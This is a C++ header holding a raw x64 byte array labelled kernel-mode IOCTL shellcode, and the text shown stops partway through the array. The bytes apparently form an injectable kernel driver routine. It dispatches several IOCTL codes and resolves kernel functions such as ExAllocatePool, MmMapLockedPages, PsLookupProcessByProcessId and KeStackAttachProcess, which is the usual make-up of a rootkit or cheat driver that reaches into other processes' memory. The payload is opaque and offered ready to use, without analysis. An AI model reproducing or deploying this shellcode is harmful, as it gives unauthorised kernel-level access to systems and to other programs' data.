#pragma once
#include <stdint.h>

namespace kernel_mode_ioctl_shellcode_resource
{
    static const uint8_t kernel_mode_ioctl_shellcode[] = {
	
	0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4c, 0x24, 0x08, 0x48, 0x81, 0xec, 0xc8, 0x04, 0x00, 
	0x00, 0xc7, 0x44, 0x24, 0x30, 0x01, 0x00, 0x00, 0xc0, 0x48, 0xc7, 0x44, 0x24, 0x60, 0x00, 0x00, 
	0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x89, 
	0x84, 0x24, 0x60, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0x60, 0x04, 0x00, 0x00, 0x48, 0x8b, 
	0x40, 0x08, 0x48, 0x89, 0x84, 0x24, 0x30, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 
	0x00, 0x00, 0x0f, 0xbe, 0x40, 0x43, 0x48, 0x8b, 0x8c, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x0f, 0xbe, 
	0x49, 0x42, 0xff, 0xc1, 0x3b, 0xc1, 0x7e, 0x0f, 0xcd, 0x2c, 0xc7, 0x84, 0x24, 0x88, 0x02, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0xeb, 0x0b, 0xc7, 0x84, 0x24, 0x88, 0x02, 0x00, 0x00, 0x01, 0x00, 
	0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 
	0x00, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8b, 0x44, 0x24, 0x60, 0x8b, 0x40, 0x18, 0x89, 0x84, 
	0x24, 0x8c, 0x02, 0x00, 0x00, 0x8b, 0x84, 0x24, 0x8c, 0x02, 0x00, 0x00, 0x89, 0x44, 0x24, 0x34, 
	0x81, 0x7c, 0x24, 0x34, 0x00, 0x20, 0x22, 0x00, 0x74, 0x3d, 0x81, 0x7c, 0x24, 0x34, 0x08, 0xa0, 
	0x22, 0x00, 0x0f, 0x84, 0x44, 0x02, 0x00, 0x00, 0x81, 0x7c, 0x24, 0x34, 0x18, 0xa0, 0x22, 0x00, 
	0x0f, 0x84, 0xe7, 0x12, 0x00, 0x00, 0x81, 0x7c, 0x24, 0x34, 0x34, 0xe1, 0x22, 0x00, 0x0f, 0x84, 
	0xac, 0x07, 0x00, 0x00, 0x81, 0x7c, 0x24, 0x34, 0x38, 0xe1, 0x22, 0x00, 0x0f, 0x84, 0x4f, 0x04, 
	0x00, 0x00, 0xe9, 0x62, 0x14, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x48, 
	0x8b, 0x40, 0x18, 0x48, 0x89, 0x84, 0x24, 0xe0, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xe0, 
	0x02, 0x00, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x89, 0x84, 0x24, 0xd8, 0x02, 0x00, 0x00, 0x48, 0x83, 
	0xbc, 0x24, 0xd8, 0x02, 0x00, 0x00, 0x00, 0x75, 0x0a, 0xb8, 0x01, 0x00, 0x00, 0xc0, 0xe9, 0x87, 
	0x14, 0x00, 0x00, 0xb8, 0x45, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xe0, 0x00, 0x00, 0x00, 
	0xb8, 0x78, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xe2, 0x00, 0x00, 0x00, 0xb8, 0x41, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xe4, 0x00, 0x00, 0x00, 0xb8, 0x6c, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0xe6, 0x00, 0x00, 0x00, 0xb8, 0x6c, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0xe8, 0x00, 0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xea, 0x00, 0x00, 
	0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xec, 0x00, 0x00, 0x00, 0xb8, 0x61, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xee, 0x00, 0x00, 0x00, 0xb8, 0x74, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0xf0, 0x00, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0xf2, 0x00, 0x00, 0x00, 0xb8, 0x50, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xf4, 0x00, 
	0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xf6, 0x00, 0x00, 0x00, 0xb8, 
	0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xf8, 0x00, 0x00, 0x00, 0xb8, 0x6c, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0xfa, 0x00, 0x00, 0x00, 0x33, 0xc0, 0x66, 0x89, 0x84, 0x24, 0xfc, 
	0x00, 0x00, 0x00, 0xb8, 0x1c, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x38, 0x03, 0x00, 0x00, 
	0xb8, 0x1e, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x3a, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x84, 
	0x24, 0xe0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x40, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x8c, 
	0x24, 0x38, 0x03, 0x00, 0x00, 0xff, 0x94, 0x24, 0xd8, 0x02, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 
	0x58, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xe0, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x10, 
	0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8b, 0x54, 0x24, 0x48, 0x33, 0xc9, 0xff, 0x94, 0x24, 0x58, 
	0x04, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x90, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xd8, 
	0x04, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0xc7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 
	0x84, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x8c, 0x24, 0x90, 0x02, 
	0x00, 0x00, 0x48, 0x89, 0x08, 0x48, 0x83, 0xbc, 0x24, 0x90, 0x02, 0x00, 0x00, 0x00, 0x75, 0x0a, 
	0xc7, 0x44, 0x24, 0x30, 0x01, 0x00, 0x00, 0xc0, 0xeb, 0x6d, 0x48, 0x8b, 0x84, 0x24, 0x90, 0x02, 
	0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x98, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x44, 0x24, 0x48, 0x48, 
	0x89, 0x84, 0x24, 0x50, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x44, 0x24, 0x48, 0x48, 0xff, 0xc8, 0x48, 
	0x89, 0x44, 0x24, 0x48, 0x48, 0x83, 0xbc, 0x24, 0x50, 0x04, 0x00, 0x00, 0x00, 0x76, 0x20, 0x48, 
	0x8b, 0x84, 0x24, 0x98, 0x02, 0x00, 0x00, 0xc6, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0x98, 0x02, 
	0x00, 0x00, 0x48, 0xff, 0xc0, 0x48, 0x89, 0x84, 0x24, 0x98, 0x02, 0x00, 0x00, 0xeb, 0xbb, 0xc7, 
	0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x48, 
	0xc7, 0x40, 0x38, 0x08, 0x00, 0x00, 0x00, 0xe9, 0x55, 0x12, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 
	0xd8, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x89, 0x84, 0x24, 0xe8, 0x02, 0x00, 0x00, 
	0x48, 0x8b, 0x84, 0x24, 0xe8, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x89, 0x84, 0x24, 0xa0, 
	0x02, 0x00, 0x00, 0x48, 0x83, 0xbc, 0x24, 0xa0, 0x02, 0x00, 0x00, 0x00, 0x75, 0x0a, 0xb8, 0x01, 
	0x00, 0x00, 0xc0, 0xe9, 0x72, 0x12, 0x00, 0x00, 0xb8, 0x52, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0xb0, 0x01, 0x00, 0x00, 0xb8, 0x74, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xb2, 0x01, 
	0x00, 0x00, 0xb8, 0x6c, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xb4, 0x01, 0x00, 0x00, 0xb8, 
	0x49, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xb6, 0x01, 0x00, 0x00, 0xb8, 0x6e, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0xb8, 0x01, 0x00, 0x00, 0xb8, 0x69, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0xba, 0x01, 0x00, 0x00, 0xb8, 0x74, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xbc, 
	0x01, 0x00, 0x00, 0xb8, 0x55, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xbe, 0x01, 0x00, 0x00, 
	0xb8, 0x6e, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xc0, 0x01, 0x00, 0x00, 0xb8, 0x69, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xc2, 0x01, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0xc4, 0x01, 0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0xc6, 0x01, 0x00, 0x00, 0xb8, 0x64, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xc8, 0x01, 0x00, 
	0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xca, 0x01, 0x00, 0x00, 0xb8, 0x53, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xcc, 0x01, 0x00, 0x00, 0xb8, 0x74, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0xce, 0x01, 0x00, 0x00, 0xb8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0xd0, 0x01, 0x00, 0x00, 0xb8, 0x69, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xd2, 0x01, 
	0x00, 0x00, 0xb8, 0x6e, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xd4, 0x01, 0x00, 0x00, 0xb8, 
	0x67, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xd6, 0x01, 0x00, 0x00, 0x33, 0xc0, 0x66, 0x89, 
	0x84, 0x24, 0xd8, 0x01, 0x00, 0x00, 0xb8, 0x28, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x48, 
	0x03, 0x00, 0x00, 0xb8, 0x2a, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x4a, 0x03, 0x00, 0x00, 
	0x48, 0x8d, 0x84, 0x24, 0xb0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x50, 0x03, 0x00, 0x00, 
	0x48, 0x8d, 0x8c, 0x24, 0x48, 0x03, 0x00, 0x00, 0xff, 0x94, 0x24, 0xa0, 0x02, 0x00, 0x00, 0x48, 
	0x89, 0x84, 0x24, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xe8, 0x02, 0x00, 0x00, 0x48, 
	0x8b, 0x50, 0x10, 0x48, 0x8d, 0x8c, 0x24, 0x80, 0x04, 0x00, 0x00, 0xff, 0x94, 0x24, 0x48, 0x04, 
	0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0x80, 0x04, 0x00, 0x00, 0xff, 0x94, 0x24, 0xa0, 0x02, 0x00, 
	0x00, 0x48, 0x89, 0x84, 0x24, 0xa8, 0x02, 0x00, 0x00, 0x48, 0x83, 0xbc, 0x24, 0xa8, 0x02, 0x00, 
	0x00, 0x00, 0x74, 0x1a, 0x48, 0x8b, 0x84, 0x24, 0xa8, 0x02, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 
	0x40, 0x04, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xeb, 0x14, 0x48, 0xc7, 
	0x84, 0x24, 0x40, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x30, 0x01, 0x00, 
	0x00, 0xc0, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0xc7, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x40, 
	0x18, 0x48, 0x8b, 0x8c, 0x24, 0xa8, 0x02, 0x00, 0x00, 0x48, 0x89, 0x08, 0x48, 0x8b, 0x84, 0x24, 
	0xd8, 0x04, 0x00, 0x00, 0x48, 0xc7, 0x40, 0x38, 0x08, 0x00, 0x00, 0x00, 0xe9, 0x20, 0x10, 0x00, 
	0x00, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x89, 0x84, 
	0x24, 0xb0, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xb0, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x40, 
	0x10, 0x48, 0x89, 0x84, 0x24, 0xb8, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xb0, 0x02, 0x00, 
	0x00, 0x48, 0x8b, 0x00, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x83, 0x7c, 0x24, 0x50, 0x00, 0x75, 
	0x0a, 0xb8, 0x01, 0x00, 0x00, 0xc0, 0xe9, 0x2f, 0x10, 0x00, 0x00, 0xb8, 0x4d, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0x00, 0x01, 0x00, 0x00, 0xb8, 0x6d, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0x02, 0x01, 0x00, 0x00, 0xb8, 0x55, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x04, 0x01, 
	0x00, 0x00, 0xb8, 0x6e, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x06, 0x01, 0x00, 0x00, 0xb8, 
	0x6d, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x08, 0x01, 0x00, 0x00, 0xb8, 0x61, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0x0a, 0x01, 0x00, 0x00, 0xb8, 0x70, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0x0c, 0x01, 0x00, 0x00, 0xb8, 0x4c, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x0e, 
	0x01, 0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x10, 0x01, 0x00, 0x00, 
	0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x12, 0x01, 0x00, 0x00, 0xb8, 0x6b, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x14, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0x16, 0x01, 0x00, 0x00, 0xb8, 0x64, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x18, 0x01, 0x00, 0x00, 0xb8, 0x50, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x1a, 0x01, 0x00, 
	0x00, 0xb8, 0x61, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x1c, 0x01, 0x00, 0x00, 0xb8, 0x67, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x1e, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0x20, 0x01, 0x00, 0x00, 0xb8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0x22, 0x01, 0x00, 0x00, 0x33, 0xc0, 0x66, 0x89, 0x84, 0x24, 0x24, 0x01, 0x00, 0x00, 0xb8, 
	0x4d, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xa0, 0x00, 0x00, 0x00, 0xb8, 0x6d, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0xa2, 0x00, 0x00, 0x00, 0xb8, 0x55, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0xa4, 0x00, 0x00, 0x00, 0xb8, 0x6e, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xa6, 
	0x00, 0x00, 0x00, 0xb8, 0x6c, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xa8, 0x00, 0x00, 0x00, 
	0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xaa, 0x00, 0x00, 0x00, 0xb8, 0x63, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xac, 0x00, 0x00, 0x00, 0xb8, 0x6b, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0xae, 0x00, 0x00, 0x00, 0xb8, 0x50, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0xb0, 0x00, 0x00, 0x00, 0xb8, 0x61, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xb2, 0x00, 0x00, 
	0x00, 0xb8, 0x67, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xb4, 0x00, 0x00, 0x00, 0xb8, 0x65, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xb6, 0x00, 0x00, 0x00, 0xb8, 0x73, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0xb8, 0x00, 0x00, 0x00, 0x33, 0xc0, 0x66, 0x89, 0x84, 0x24, 0xba, 0x00, 
	0x00, 0x00, 0xb8, 0x49, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x68, 0xb8, 0x6f, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x44, 0x24, 0x6a, 0xb8, 0x46, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x6c, 
	0xb8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x6e, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x44, 0x24, 0x70, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x72, 0xb8, 0x4d, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x74, 0xb8, 0x64, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 
	0x24, 0x76, 0xb8, 0x6c, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x78, 0x33, 0xc0, 0x66, 0x89, 
	0x44, 0x24, 0x7a, 0xb8, 0x24, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x58, 0x03, 0x00, 0x00, 
	0xb8, 0x26, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x5a, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x84, 
	0x24, 0x00, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x60, 0x03, 0x00, 0x00, 0xb8, 0x1a, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x68, 0x03, 0x00, 0x00, 0xb8, 0x1c, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0x6a, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x84, 0x24, 0xa0, 0x00, 0x00, 0x00, 0x48, 
	0x89, 0x84, 0x24, 0x70, 0x03, 0x00, 0x00, 0xb8, 0x12, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x78, 0x03, 0x00, 0x00, 0xb8, 0x14, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x7a, 0x03, 0x00, 
	0x00, 0x48, 0x8d, 0x44, 0x24, 0x68, 0x48, 0x89, 0x84, 0x24, 0x80, 0x03, 0x00, 0x00, 0x48, 0x8d, 
	0x8c, 0x24, 0x58, 0x03, 0x00, 0x00, 0xff, 0x54, 0x24, 0x50, 0x48, 0x89, 0x84, 0x24, 0x38, 0x04, 
	0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0x68, 0x03, 0x00, 0x00, 0xff, 0x54, 0x24, 0x50, 0x48, 0x89, 
	0x84, 0x24, 0x28, 0x04, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0x78, 0x03, 0x00, 0x00, 0xff, 0x54, 
	0x24, 0x50, 0x48, 0x89, 0x84, 0x24, 0x20, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x94, 0x24, 0xb8, 0x02, 
	0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xb0, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x48, 0x18, 0xff, 0x94, 
	0x24, 0x38, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x8c, 0x24, 0xb8, 0x02, 0x00, 0x00, 0xff, 0x94, 0x24, 
	0x28, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x8c, 0x24, 0xb8, 0x02, 0x00, 0x00, 0xff, 0x94, 0x24, 0x20, 
	0x04, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xe9, 0xd1, 0x0c, 0x00, 0x00, 
	0x48, 0xc7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 0x00, 
	0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 
	0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x89, 0x84, 0x24, 0xf8, 0x02, 0x00, 0x00, 0x48, 0x8b, 
	0x44, 0x24, 0x58, 0x48, 0x8b, 0x00, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x83, 0x7c, 0x24, 0x38, 
	0x00, 0x75, 0x0a, 0xb8, 0x01, 0x00, 0x00, 0xc0, 0xe9, 0xdd, 0x0c, 0x00, 0x00, 0xb8, 0x50, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x10, 0x02, 0x00, 0x00, 0xb8, 0x73, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0x12, 0x02, 0x00, 0x00, 0xb8, 0x4c, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x14, 0x02, 0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x16, 0x02, 0x00, 
	0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x18, 0x02, 0x00, 0x00, 0xb8, 0x6b, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x1a, 0x02, 0x00, 0x00, 0xb8, 0x75, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0x1c, 0x02, 0x00, 0x00, 0xb8, 0x70, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0x1e, 0x02, 0x00, 0x00, 0xb8, 0x50, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x20, 0x02, 
	0x00, 0x00, 0xb8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x22, 0x02, 0x00, 0x00, 0xb8, 
	0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x24, 0x02, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0x26, 0x02, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0x28, 0x02, 0x00, 0x00, 0xb8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x2a, 
	0x02, 0x00, 0x00, 0xb8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x2c, 0x02, 0x00, 0x00, 
	0xb8, 0x42, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x2e, 0x02, 0x00, 0x00, 0xb8, 0x79, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x30, 0x02, 0x00, 0x00, 0xb8, 0x50, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0x32, 0x02, 0x00, 0x00, 0xb8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x34, 0x02, 0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x36, 0x02, 0x00, 
	0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x38, 0x02, 0x00, 0x00, 0xb8, 0x65, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x3a, 0x02, 0x00, 0x00, 0xb8, 0x73, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0x3c, 0x02, 0x00, 0x00, 0xb8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0x3e, 0x02, 0x00, 0x00, 0xb8, 0x49, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x40, 0x02, 
	0x00, 0x00, 0xb8, 0x64, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x42, 0x02, 0x00, 0x00, 0x33, 
	0xc0, 0x66, 0x89, 0x84, 0x24, 0x44, 0x02, 0x00, 0x00, 0xb8, 0x4b, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0x80, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x82, 
	0x01, 0x00, 0x00, 0xb8, 0x53, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x84, 0x01, 0x00, 0x00, 
	0xb8, 0x74, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x86, 0x01, 0x00, 0x00, 0xb8, 0x61, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x88, 0x01, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0x8a, 0x01, 0x00, 0x00, 0xb8, 0x6b, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x8c, 0x01, 0x00, 0x00, 0xb8, 0x41, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x8e, 0x01, 0x00, 
	0x00, 0xb8, 0x74, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x90, 0x01, 0x00, 0x00, 0xb8, 0x74, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x92, 0x01, 0x00, 0x00, 0xb8, 0x61, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0x94, 0x01, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0x96, 0x01, 0x00, 0x00, 0xb8, 0x68, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x98, 0x01, 
	0x00, 0x00, 0xb8, 0x50, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x9a, 0x01, 0x00, 0x00, 0xb8, 
	0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x9c, 0x01, 0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 
